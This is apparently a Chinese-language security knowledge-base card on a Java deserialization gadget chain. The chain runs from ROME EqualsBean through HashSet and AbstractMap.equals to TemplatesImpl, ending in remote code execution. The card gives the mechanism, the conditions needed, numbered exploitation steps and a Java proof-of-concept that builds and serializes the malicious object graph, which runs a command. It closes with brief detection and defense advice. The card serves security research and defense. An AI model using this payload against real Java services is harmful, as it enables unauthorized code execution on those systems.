---
id: web-java-deser-rome-equalsbean-beanequals-hashset-templatesimpl
title: ROME EqualsBean.equals/beanEquals 经 HashSet→AbstractMap.equals 触发 TemplatesImpl 字节码加载
type: scenario
domain: web
path: web/java/deserialization
technique: rome-equalsbean-beanequals-hashset-templatesimpl
aliases:
- EqualsBean equals 链
- HashSet Rome 链
- beanEquals TemplatesImpl
- AbstractMap equals 触发
- rome hashset 反序列化
tags:
- java
- deserialization
- gadget
- rome
- equalsbean
- hashset
- abstractmap
- templatesimpl
- rce
cve: []
severity: high
confidence: high
status: verified
created: '2026-11-12'
updated: '2026-11-12'
verification:
  verified_by: verifier-V606
  verified_at: '2026-11-12T18:35:52+08:00'
  notes: 已对照原文第9节与图17/18核对：HashSet.readObject→HashMap.put→putVal 比较→AbstractMap.equals 的 value.equals(m.get(key))→EqualsBean.equals→beanEquals→Templates getter→TemplatesImpl.getOutputProperties，两个键对称 HashMap 哈希和相同、EqualsBean 占位后反射改 _beanClass/_obj 的构造方式均与原文 EXP 及调试截图一致。dedup 与既有 rome 卡使用不同方法（beanEquals vs beanHashCode）与不同容器触发（HashSet/AbstractMap vs HashMap 键哈希），非同链。原文仅第3节写环境依赖 rome 1.0，未声明受影响版本/区间，affected_versions 已 --clear。PoC 未在本机执行。
---

## 一句话结论

把两个键相同、value 互换的 `HashMap` 放进 `HashSet`，并让其中一个 value 是构造期无害的 `EqualsBean`：`HashSet.readObject` 逐个向内部 `HashMap` put 元素时，两个 map 的 `AbstractMap.hashCode` 相同，桶内比较走 `map2.equals(map1)` → `AbstractMap.equals` 的 `value.equals(m.get(key))`；序列化前再把该 `EqualsBean._beanClass` 改为 `Templates.class`、`_obj` 改为填好 `_bytecodes` 的 `TemplatesImpl`，反序列化时 `EqualsBean.equals → beanEquals` 会对 `Templates` 接口 getter 反射调用，触发 `getOutputProperties()` 加载字节码。

## 原理

- **入口**：`HashSet.readObject` 把流中每个元素依次 `map.put(element, PRESENT)`；元素是两个 `HashMap`。
- **为什么两个 map 会进入 equals 比较**：`AbstractMap.hashCode()` 是各 entry 哈希之和，两个“键相同、value 互换”的 map 求和相同，落进同一哈希桶；第二次 `putVal` 的桶内比较执行 `key.equals(k)`（新读入的 map2 对已存的 map1），即 `AbstractMap.equals`。
- **AbstractMap.equals 的比较方式**：遍历 map2 的每个 entry，执行 `value.equals(m.get(key))`；把 map2 中某 key 的 value 设为 `EqualsBean` 对象、map1 同 key 的 value 设为 `TemplatesImpl`，比较就转给 `EqualsBean.equals(TemplatesImpl)`。
- **EqualsBean.beanEquals 的反射 getter**：`equals(obj)` 直接调 `beanEquals(obj)`；后者在 `_beanClass.isInstance(obj)` 成立后，遍历 `BeanIntrospector.getPropertyDescriptors(_beanClass)` 的每个 read 方法，分别对 `this._obj`（bean1）和 `obj`（bean2）执行 `pReadMethod.invoke(..., NO_PARAMS)` 并比较结果。把 `_beanClass` 设为只声明 `newTransformer/getOutputProperties` 的 `Templates` 接口、`_obj` 设为 `TemplatesImpl`，即触发 `getOutputProperties()`。
- **构造期的坑**：`EqualsBean` 以无害参数（如 `String.class` + `"s"`）构造，先在 map1/map2 中放好引用，等 `HashSet` 组好后，再反射改 `_beanClass` 为 `Templates.class`、`_obj` 为真实 `TemplatesImpl`，避免生成端提前触发。原文两个 map 使用同一个 EqualsBean 引用：map1 = {yy→bean, zZ→templates}，map2 = {zZ→bean, yy→templates}。
- **为什么成立**：`AbstractMap.equals` 是标准库的逐 entry 值比较，`EqualsBean` 把 equals 实现成“对两个 bean 各调一遍 getter 再比较”，`TemplatesImpl` 的 getter 加载字节码；全程只依赖这些类在 classpath，不需要补丁缺失。
- **容器互换**：原文指出该组链的 `HashMap`、`HashSet`、`Hashtable` 可以相互替换，核心是让某容器在反序列化时对两个对象执行 equals。

## 触发条件

- 存在 Java 原生反序列化入口，攻击者可控序列化流。
- classpath 含 rome 1.0（`com.sun.syndication.feed.impl.EqualsBean`/`ToStringBean`）。
- JDK 提供可反射写入的 `TemplatesImpl`（JDK 8 最直接；高版本需模块 opens 或外部 Xalan）。
- 反序列化过滤器未拦截 `HashSet`、`HashMap`、`EqualsBean`、`TemplatesImpl`。
- `Runtime.exec` 等命令执行未被策略阻断。

## 利用步骤

1. 生成继承 `AbstractTranslet` 的子类字节码（静态初始化块执行命令），构造 `TemplatesImpl` 并设置 `_bytecodes`、`_name`。
2. `EqualsBean bean = new EqualsBean(String.class, "s")`（无害占位，避免构造期触发）。
3. 构造 map1 = {yy→bean, zZ→templates}、map2 = {zZ→bean, yy→templates}，依次 `add` 进 `HashSet`。
4. 反射把 bean 的 `_beanClass` 设为 `Templates.class`、`_obj` 设为 `TemplatesImpl`。
5. 序列化 `HashSet` 并发送到目标入口；目标 `readObject` 时 map2.equals(map1) → `AbstractMap.equals` → `bean.equals(templates)` → `beanEquals` → `getOutputProperties()` → 字节码执行。
6. 验证：本地反序列化弹计算器/执行命令；失败时检查两个 map 的键是否对称、`_beanClass.isInstance(_obj)` 是否成立、过滤器是否拦截。

## PoC

```java
// 关键构造（省略 translet 生成与 setField 辅助方法；未在本机复跑）
byte[] translet = makeAbstractTranslet("java.lang.Runtime.getRuntime().exec(\"calc\");");
TemplatesImpl templates = new TemplatesImpl();
setField(templates, "_bytecodes", new byte[][]{translet});
setField(templates, "_name", "test");
setField(templates, "_tfactory", null);

EqualsBean bean = new EqualsBean(String.class, "s");   // 占位，_beanClass 与 _obj 稍后替换

HashMap<Object, Object> map1 = new HashMap<>();
HashMap<Object, Object> map2 = new HashMap<>();
map1.put("yy", bean);
map1.put("zZ", templates);
map2.put("zZ", bean);
map2.put("yy", templates);

HashSet<Object> set = new HashSet<>();
set.add(map1);
set.add(map2);

setField(bean, "_beanClass", Templates.class);
setField(bean, "_obj", templates);

try (ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream("equals.ser"))) {
    oos.writeObject(set);
}
```

## 变体与关联

- [[web-java-deser-rome-equalsbean-tostringbean-templatesimpl]]：同为 EqualsBean 入口，但走 `hashCode → beanHashCode → _obj.toString()`；本卡走 `equals → beanEquals`，对 `_obj` 与对手 bean 分别反射调用 getter，触发路径与对象图不同。
- [[web-java-deser-commonscollections-cc6-hashmap-hashset-invokertransformer]]、[[web-java-deser-commonscollections-cc8-hashset-urlclassloader-remote-class]]：同为 HashSet 容器触发的反序列化链，可对照容器/比较路径。
- [[web-java-deser-rome-spring-hotswappable-xstring-tostringbean-templatesimpl]]：另一条在 HashMap.putVal 中利用 equals 触发的 Rome 链（HotSwappableTargetSource/XString）。
- 变体：`_beanClass` 换成只含危险 getter 的接口/类；下游可换 JNDI 等；`HashSet`/`HashMap`/`Hashtable` 可互换。
- 边界：`beanEquals` 先做 `_beanClass.isInstance(obj)`，obj 必须是 TemplatesImpl 实例；过滤器拦截或 TemplatesImpl 被强封装时链断。

## 检测与防御

- 检测：序列化流中出现 `java.util.HashSet` 内嵌两个键对称的 `HashMap`、`com.sun.syndication.feed.impl.EqualsBean`（且 `_beanClass` 指向 `Templates`）与 `TemplatesImpl` 的组合；调用栈出现 `AbstractMap.equals → EqualsBean.beanEquals → BeanIntrospector.getPropertyDescriptors → TemplatesImpl.getOutputProperties`。
- 防御：JEP 290 类白名单；移除不必要的 rome 依赖；升级 JDK 并开启模块强封装；限制命令执行。
- 响应：保留原始流证据，确认是否执行命令，排查同入口其它 gadget。
